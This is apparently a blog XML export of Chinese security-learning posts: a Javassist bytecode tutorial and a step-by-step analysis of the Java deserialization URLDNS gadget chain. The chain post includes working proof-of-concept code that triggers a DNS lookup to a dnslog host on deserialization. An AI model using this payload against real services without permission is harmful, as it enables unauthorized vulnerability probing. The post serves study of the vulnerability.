class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur=cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack.empty())&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            <span class="keyword">if</span>(cur.right!=<span class="literal">null</span> &amp;&amp; prev!=cur.right)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur=cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.add(cur.val);</span><br><span class="line">                prev=cur;</span><br><span class="line">                cur=<span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Binary Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之Javassist(8)</title>
    <url>/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>Javassist</strong>是一个可以<strong>动态</strong>生成Java字节码(.class)的库，它可以在<strong>运行</strong>的时候生成新的类。有时候，我们需要在所有class都被编译完后，运行时再修改或新建一个class文件，Javassist可以帮助我们达到这个目的。</p>
<h1 id="Javassist基本元素"><a href="#Javassist基本元素" class="headerlink" title="Javassist基本元素"></a>Javassist基本元素</h1><p><strong>CtClass</strong> - Compile Time Class - 即编译时的Class，每个<strong>需要修改编辑</strong>的class都对应一个CtClass instance</p>
<p><strong>ClassPool</strong> - 一个存储<strong>CtClass对象</strong>的容器</p>
<p><strong>CtField</strong> - Java中的field</p>
<p><strong>CtMethod</strong> - Java中的method</p>
<span id="more"></span>

<h1 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><h3 id="方法一：pom-xml"><a href="#方法一：pom-xml" class="headerlink" title="方法一：pom.xml"></a>方法一：pom.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：导入jar包</strong></p>
<p>可在网上下载jar包，导入module，library</p>
<h2 id="创建Class"><a href="#创建Class" class="headerlink" title="创建Class"></a>创建Class</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">/*创建Class*/</span></span><br><span class="line">        <span class="comment">//需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//获取一个默认的ClassPool</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> cp.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//用这个ClassPool来创建一个CtClass，名字为Evil</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*添加Field*/</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(cp.get(<span class="string">&quot;java.lang.String&quot;</span>),<span class="string">&quot;name&quot;</span>,test);<span class="comment">//create a String-type field called name for the class test</span></span><br><span class="line">        name.setModifiers(Modifier.PRIVATE);<span class="comment">//private attribute</span></span><br><span class="line">        test.addField(name,CtField.Initializer.constant(<span class="string">&quot;Mark&quot;</span>));<span class="comment">//给test class里的name字段初始化为Mark</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*添加constructor*/</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,test);<span class="comment">//给Test Class创建一个无参constructor</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name=\&quot;Jack\&quot;;&#125;&quot;</span>);</span><br><span class="line">        test.addConstructor(ctConstructor);</span><br><span class="line">        <span class="comment">//有参构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;cp.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,test);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.name=$1;&#125;&quot;</span>);<span class="comment">//this.name = name(第一个parameter)</span></span><br><span class="line">        test.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*添加method*/</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">printName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;printName&quot;</span>,<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,test);</span><br><span class="line">        printName.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        printName.setBody(<span class="string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);</span><br><span class="line">        printName.insertBefore(<span class="string">&quot;System.out.println(\&quot;before:\&quot;);&quot;</span>);<span class="comment">//在方法体前面加入（注意必须有了方法体才能插入）</span></span><br><span class="line">        printName.insertAfter(<span class="string">&quot;System.out.println(\&quot;after:\&quot;);&quot;</span>);<span class="comment">//在方法体后面加入</span></span><br><span class="line">        test.addMethod(printName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*写出Class到本地*/</span></span><br><span class="line">        test.writeFile();</span><br><span class="line">        test.detach();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/image-20211124203629163.png" alt="image-20211124203629163"></p>
<h1 id="一些特殊参数"><a href="#一些特殊参数" class="headerlink" title="一些特殊参数"></a>一些特殊参数</h1><table>
<thead>
<tr>
<th>标识符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>0、1、$2、 3 、 3、 3、…</td>
<td>this和方法参数（1-N是方法参数的顺序，如第一个parameter）</td>
</tr>
<tr>
<td>$args</td>
<td>方法参数数组，类型为Object[]</td>
</tr>
<tr>
<td>$$</td>
<td>所有方法参数，例如：m($$)相当于m(1,1,2,…)</td>
</tr>
<tr>
<td>$cflow(…)</td>
<td>control flow 变量</td>
</tr>
<tr>
<td>$r</td>
<td>返回结果的类型，在强制转换表达式中使用。</td>
</tr>
<tr>
<td>$w</td>
<td>包装器类型，在强制转换表达式中使用。</td>
</tr>
<tr>
<td>$_</td>
<td>返回的结果值</td>
</tr>
<tr>
<td>$sig</td>
<td>类型为java.lang.Class的参数类型对象数组</td>
</tr>
<tr>
<td>$type</td>
<td>类型为java.lang.Class的返回值类型</td>
</tr>
<tr>
<td>$class</td>
<td>类型为java.lang.Class的正在修改的类</td>
</tr>
</tbody></table>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://juejin.cn/post/6952765170544279566#heading-13">Java字节码编程之非常好用的javassist</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之URLDNS利用链(7)</title>
    <url>/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尽管我们已经了解了一些反序列化漏洞的知识，但有什么办法能够快速检测反序列化的点吗？URLDNS能够帮助我们实现这一点。URLDNS不依赖第三方库，不限制jdk版本。</p>
<p>但URLDNS不能执行命令，仅能用于发送DNS请求，以来验证是否有反序列化代码<code>readObject()</code>存在。</p>
<span id="more"></span>

<h1 id="简易利用链及利用方法"><a href="#简易利用链及利用方法" class="headerlink" title="简易利用链及利用方法"></a>简易利用链及利用方法</h1><h2 id="URLDNS平台"><a href="#URLDNS平台" class="headerlink" title="URLDNS平台"></a>URLDNS平台</h2><p>学习该章，推荐使用<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
<p>点击Get SubDomain可以得到一个域名。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201121893.png" alt="image-20211116201121893"></p>
<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();<span class="comment">// 定义一个hashMap，key为URL,value为String</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://e3h66m.dnslog.cn&quot;</span>);<span class="comment">// 设置我们触发dns查询的url</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span></span><br><span class="line">        <span class="comment">// 1. 将url的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 2. 设置url的hashCode字段为任意不为-1的值</span></span><br><span class="line">        f.set(url, <span class="number">111</span>);</span><br><span class="line">        System.out.println(url.hashCode()); <span class="comment">// 获取hashCode的值，验证是否修改成功</span></span><br><span class="line">        <span class="comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码后，刷新DNSURL平台页面，发现已有记录 - 利用成功。</p>
<h1 id="简易利用链分析-Java-1-7"><a href="#简易利用链分析-Java-1-7" class="headerlink" title="简易利用链分析(Java 1.7)"></a>简易利用链分析(Java 1.7)</h1><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h2><p>我们在<code>ois.readObject()</code>处下断点，分析反序列化的过程。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201341776.png" alt="image-20211116201341776"></p>
<p>利用点主要在<code>HashMap</code>类下的<code>readObject()</code>，之前我们有讲过，<code>readObject()</code>方法是可以被复写的，所以之前的代码中的<code>ois.readObject();</code>实际上会call到我们序列化的<code>HashMap</code>中的<code>readObject()</code>。</p>
<p>跟进去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    s.defaultReadObject();<span class="comment">//此处执行默认的readObject()方法</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;<span class="comment">//判断loadFactor的值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个空表</span></span><br><span class="line">    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line">    s.readInt(); <span class="comment">// 获取key-value的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)<span class="comment">//判断个数值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面初始化Capacity</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">                mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                <span class="comment">// we have limits...</span></span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate the bucket array;</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inflateTable(capacity);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        threshold = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="comment">//获取keys和values，并进行PUT操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();<span class="comment">//获取key</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();<span class="comment">//获取value</span></span><br><span class="line">        putForCreate(key, value);<span class="comment">//重点在此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="putForCreate"><a href="#putForCreate" class="headerlink" title="putForCreate()"></a>putForCreate()</h2><p>继续跟进<code>putForCreate(key,value)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);<span class="comment">//*判断key是否为空，如果不为空，计算key的hash值*</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Look for preexisting entry for key.  This will never happen for</span></span><br><span class="line"><span class="comment">     * clone or deserialize.  It will only happen for construction if the</span></span><br><span class="line"><span class="comment">     * input Map is a sorted map whose ordering is inconsistent w/ equals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">            e.value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createEntry(hash, key, value, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hash"><a href="#hash" class="headerlink" title="hash()"></a>hash()</h2><p>注意我们这里call的是<code>hash(key)</code>，我们看看<code>hash()</code>是怎么实现的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;<span class="comment">//此处k为我们传入的HashMap的key</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;<span class="comment">//此处会获取hashSeed（默认为0）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;<span class="comment">//如果hashSeed不为0，且传入的Object为String的话执行下面代码</span></span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();<span class="comment">//否则执行传入的object的hashCode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h2><p><strong>重点</strong>：很明显，<code>k.hashCode()</code>是指URL类的hashCode()方法，因为我们传入的是URL object，所以我们需要跟踪<code>URL.hashCode();</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)<span class="comment">//如果hashCode不等于-1，那么我们就返回hashCode</span></span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);<span class="comment">//否则调用 handler.hashCode() 计算 hash 值 .</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们仍然没有发现有触发DNS请求的地方，如果hashCode不等于-1，直接返回hashCode，我们的这条链就走不下去了，所以我们得保证<strong>hashCode等于-1</strong>，这样我们才能执行<code>handler.hashCode(this);</code></p>
<p>由代码可知，hashCode默认值为-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>但是当我们通过 <code>HashMap.readObject()</code> 方法获取 key 的值时 ,key 的HashCode 就不会为 <code>-1</code> 了（注释掉前面利用链代码中修改hashCode的部分进行断点调试），如下图：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116204410674.png" alt="image-20211116204410674"></p>
<p>所以我们需要手动修改HashCode，让它为-1 - 这也是为什么简易利用链中用<code>f.set(url, -1);</code>设置hashCode为-1。但同时我们发现，在生成payload时的<code>put()</code>函数也会经过这条链：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116205521655.png" alt="image-20211116205521655"></p>
<p>hash-&gt;URL.hashCode()，这样的话因为hashCode会保持默认值-1(在生成payload的操作中并没有改变hashCode)。<img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116205741746.png" alt="image-20211116205741746"></p>
<p>但我们不能让他在生成payload的时候就发送URLDNS请求，所以我们可以在生成payload - **执行hashMap.put()**之前改变hashCode的值，让它不为-1，在put完之后再改回-1方便payload被执行。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210115810.png" alt="image-20211116210115810"></p>
<h2 id="handler-hashCode"><a href="#handler-hashCode" class="headerlink" title="handler.hashCode()"></a>handler.hashCode()</h2><p>继续跟进<code>hashCode = handler.hashCode(this);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();<span class="comment">//获取协议</span></span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//获取地址</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)<span class="comment">//获取端口</span></span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码可知，java会先获取protocol,所以我们在构造利用链的时候，<strong>需要将我们接收URLDNS的地址加上相应的协议(如http://)</strong></p>
<h2 id="getHostAddress"><a href="#getHostAddress" class="headerlink" title="getHostAddress()"></a>getHostAddress()</h2><p>我们继续跟进<code>getHostAddress(u);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//先判断该URL的hostAddress属性是否已经有值了</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//如果已有值，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//获取Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//获取IP地址，并把值赋给URL的hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面我们可以看到，如果程序在之前已经执行过payload(或者已经访问过我们设置的DNS)，就不会再触发第二次，因为已有缓存在<code>hostAddress</code>处。 所以我们需要提供一个<strong>没有被解析过的域名</strong>。</p>
<h2 id="InetAddress-getByName"><a href="#InetAddress-getByName" class="headerlink" title="InetAddress.getByName()"></a>InetAddress.getByName()</h2><p>继续跟进<code>InetAddress.getByName(host)</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210657890.png" alt="image-20211116210657890"></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210710023.png" alt="image-20211116210710023"></p>
<h2 id="getAllByName"><a href="#getAllByName" class="headerlink" title="getAllByName()"></a>getAllByName()</h2><p>一直跟进到<code>getAllByName()</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211025208.png" alt="image-20211116211025208"></p>
